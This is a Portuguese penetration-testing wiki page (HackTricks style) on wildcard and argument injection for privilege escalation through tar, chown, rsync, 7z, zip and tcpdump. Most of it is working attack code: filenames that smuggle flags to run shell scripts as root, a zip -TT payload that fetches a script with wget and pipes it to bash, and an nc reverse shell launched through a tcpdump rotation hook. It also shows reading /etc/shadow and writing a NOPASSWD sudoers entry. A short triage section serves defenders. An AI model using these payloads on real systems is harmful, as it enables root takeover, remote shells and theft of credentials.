# Truques extras com Wildcards

{{#include ../../banners/hacktricks-training.md}}

> A **injeção de argumentos com Wildcard** (também chamada de *glob*) ocorre quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard não delimitado por aspas, como `*`.
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que consiga criar arquivos no diretório de trabalho pode criar nomes de arquivo que começam com `-`, fazendo com que sejam interpretados como **opções em vez de dados**, efetivamente inserindo flags arbitrárias ou até mesmo comandos.
> Esta página reúne as primitives mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o proprietário/grupo ou os bits de permissão de um arquivo arbitrário** abusando da flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando o root executar posteriormente algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` é injetado, fazendo com que *todos* os arquivos correspondentes herdem a propriedade/permissões de `/root/secret``file`.

*PoC e ferramenta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).  
Consulte também o artigo clássico da DefenseCode para obter detalhes.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute comandos arbitrários abusando do recurso **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Quando root executa, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` é executado como root.

### bsdtar / macOS 14+

O `tar` padrão das versões recentes do macOS (baseado em `libarchive`) não implementa `--checkpoint`, mas ainda é possível obter execução de código com a flag **--use-compress-program**, que permite especificar um compressor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, `/bin/sh` será iniciado.

---

## rsync

O `rsync` permite substituir o shell remoto ou até mesmo o binário remoto por meio de flags de linha de comando que começam com `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se o root posteriormente arquivar o diretório com `rsync -az * backup:/srv/`, a flag injetada inicia seu shell no lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado *defensivamente* prefixa o wildcard com `--` (para impedir a análise de opções), o formato do 7-Zip oferece suporte a **arquivos de lista de arquivos** ao prefixar o nome do arquivo com `@`. Combiná-lo com um symlink permite *exfiltrar arquivos arbitrários*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se o root executar algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
O 7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e abortará, **exibindo o conteúdo em stderr**.

Isso funciona mesmo com `-- *` porque a CLI do 7-Zip aceita explicitamente tanto nomes de arquivos comuns quanto `@listfiles` como entradas posicionais; portanto, um nome de arquivo literal como `@root.txt` ainda será tratado de forma especial.

---

## zip

Existem dois primitives muito práticos quando uma aplicação passa nomes de arquivos controlados pelo usuário para `zip` (seja por meio de um wildcard ou enumerando nomes sem `--`).

- RCE via test hook: `-T` habilita o “test archive” e `-TT <cmd>` substitui o tester por um programa arbitrário (forma longa: `--unzip-command <cmd>`). Se você puder injetar nomes de arquivos que começam com `-`, divida as flags entre nomes de arquivos distintos para que o parsing de short-options funcione:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NÃO tente usar um único nome de arquivo como `'-T -TT <cmd>'` — as opções curtas são analisadas caractere por caractere, e isso falhará. Use tokens separados, conforme mostrado.
- Se as barras forem removidas dos nomes de arquivo pelo aplicativo, faça o fetch de um host/IP sem caminho (o caminho padrão é `/index.html`), salve localmente com `-O` e execute.
- Você pode depurar a análise com `-sc` (mostrar os argv processados) ou `-h2` (mais ajuda) para entender como seus tokens são consumidos.

Exemplo (comportamento local no zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Exfiltração de dados/leak: Se a camada web ecoar o stdout/stderr de `zip` (comum em wrappers ingênuos), flags injetadas como `--help` ou falhas causadas por opções inválidas aparecerão na resposta HTTP, confirmando a injeção de linha de comando e ajudando a ajustar o payload.

---

## Binaries adicionais vulneráveis a wildcard injection (lista rápida de 2023-2025)

Os comandos a seguir foram abusados em CTFs modernos e em ambientes reais. O payload é sempre criado como um *nome de arquivo* dentro de um diretório com permissão de escrita que posteriormente será processado com um wildcard:

| Binary | Flag a explorar | Efeito |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Ler o conteúdo de arquivos |
| `flock` | `-c <cmd>` | Executar um comando |
| `git`   | `-c core.sshCommand=<cmd>` | Execução de comandos via git sobre SSH |
| `scp`   | `-S <cmd>` | Iniciar um programa arbitrário em vez de ssh |

Essas primitives são menos comuns do que os clássicos *tar/rsync/zip*, mas vale a pena verificá-las durante a busca.

---

## Buscando wrappers e jobs vulneráveis

Estudos de caso recentes mostraram que wildcard/argv injection não é mais apenas um problema de **cron + tar**. A mesma classe de bug continua aparecendo em:

- recursos web que fazem "download de tudo como zip/tar" a partir de diretórios de upload controlados pelo atacante
- debug shells de fornecedores/appliances que expõem um wrapper de **tcpdump** com campos de nome de arquivo/filtro controlados pelo atacante
- jobs de backup ou rotação que executam `tar`, `rsync`, `7z`, `zip`, `chown` ou `chmod` em diretórios com permissão de escrita

Comandos úteis para triagem:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heurísticas rápidas:

- `-- *` é uma boa correção para muitas ferramentas GNU, mas **não** para `7z`/`7za`, porque `@listfiles` são analisados separadamente.
- Para `zip`, procure wrappers que enumerem diretamente filenames controlados pelo usuário; a divisão de short-options (`-T` + `-TT <cmd>`) ainda funciona mesmo sem um shell glob.
- Para `tcpdump`, preste atenção especial a wrappers que permitem controlar **nomes dos arquivos de saída**, **configurações de rotação** ou argumentos de **replay de arquivos de captura**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection em wrappers

Quando um restricted shell ou wrapper de fornecedor cria uma command line do `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro de "nome do arquivo") sem quoting/validação rigorosos, é possível inserir flags adicionais do `tcpdump`. A combinação de `-G` (rotação baseada em tempo), `-W` (limite do número de arquivos) e `-z <cmd>` (comando executado após a rotação) resulta em execução arbitrária de comandos como o usuário que executa o tcpdump (frequentemente root em appliances).

Pré-requisitos:

- Você pode influenciar o `argv` passado ao `tcpdump` (por exemplo, por meio de um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- O wrapper não sanitiza espaços ou tokens iniciados por `-` no campo de nome do arquivo.

PoC clássico (executa um script de reverse shell a partir de um path com permissão de escrita):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalhes:

- `-G 1 -W 1` força uma rotação imediata após o primeiro pacote correspondente.
- `-z <cmd>` executa o comando pós-rotação uma vez por rotação. Muitas builds executam `<cmd> <savefile>`. Se `<cmd>` for um script/interpretador, certifique-se de que o tratamento dos argumentos corresponda ao seu payload.

Variantes sem mídia removível:

- Se você tiver qualquer outra primitive para escrever arquivos (por exemplo, um command wrapper separado que permita redirecionamento de saída), coloque seu script em um path conhecido e acione `-z /bin/sh /path/script.sh` ou `-z /path/script.sh`, dependendo da semântica da plataforma.
- Alguns vendor wrappers fazem a rotação para locais controláveis pelo attacker. Se você puder influenciar o path rotacionado (symlink/directory traversal), poderá direcionar `-z` para executar conteúdo totalmente controlado por você, sem mídia externa.

---

## sudoers: tcpdump com wildcards/argumentos adicionais → escrita/leitura arbitrária e root

Padrão inseguro muito comum no sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Questões
- O `*` glob e os padrões permissivos restringem apenas o primeiro argumento `-w`. O `tcpdump` aceita várias opções `-w`; a última prevalece.
- A regra não fixa outras opções, portanto `-Z`, `-r`, `-V` etc. são permitidas.

Primitivas
- Substituir o caminho de destino com um segundo `-w` (o primeiro apenas satisfaz o sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro do primeiro `-w` para escapar da árvore restrita:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Force a propriedade da saída com `-Z root` (cria arquivos pertencentes ao root em qualquer lugar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Escrita de conteúdo arbitrário ao reproduzir um PCAP criado via `-r` (por exemplo, para inserir uma linha no sudoers):

<details>
<summary>Crie um PCAP que contenha o payload ASCII exato e escreva-o como root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Leitura arbitrária de arquivos/secret leak com `-V <file>` (interpreta uma lista de savefiles). Os diagnósticos de erro frequentemente repetem as linhas, causando leak de conteúdo:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referências

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
